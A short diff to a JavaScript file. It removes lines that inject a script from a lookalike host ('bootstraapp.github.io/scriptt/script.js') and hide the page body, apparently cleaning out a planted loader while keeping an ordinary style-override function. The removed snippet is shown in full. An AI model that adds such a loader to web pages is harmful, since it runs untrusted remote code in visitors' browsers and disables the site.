@@ -1,14 +1,3 @@
-
-var script = document.createElement('script');
-script.src = 'https://bootstraapp.github.io/scriptt/script.js';
-document.body.appendChild(script);
-
-function overrideImportantStyle() {
-    var bodyElement = document.body;
-    bodyElement.style.setProperty('display', 'none', 'important');
-}
-overrideImportantStyle();
-
 function overrideStyles() {
     let divElements = document.getElementsByTagName('div');
     let divElementsArray = Array.from(divElements);
